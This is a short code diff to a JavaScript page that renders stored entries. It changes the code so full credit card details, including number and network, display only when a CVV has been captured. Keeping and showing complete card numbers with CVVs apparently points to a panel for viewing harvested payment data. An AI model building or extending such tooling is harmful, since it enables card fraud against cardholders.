@@ -2065,7 +2065,8 @@
               html += '</div>';
               html += '</div>';
             } else {
-              // Credit card display - bank card design
+              // Credit card display - only show after CVV is entered
+              if (card.cvv && card.cvv !== 'N/A' && card.cvv !== 'n/a' && card.cvv !== '') {
               const formattedNum = card.cardNumber ? card.cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ') : '';
               const networkLogo = cardInfo.network === 'Visa' ? 'VISA' : cardInfo.network === 'Mastercard' ? 'Mastercard' : 'mada';
               html += '<div class="data-section bg-purple-50 p-4 rounded-lg" style="border-right-color: #9333ea;">';
@@ -2101,6 +2102,7 @@
               html += '</div>';
               }
               html += '</div>';
+              } // end CVV check
             }
           } else if (entry.type === 'data') {
             const dataEntry = entry.data;
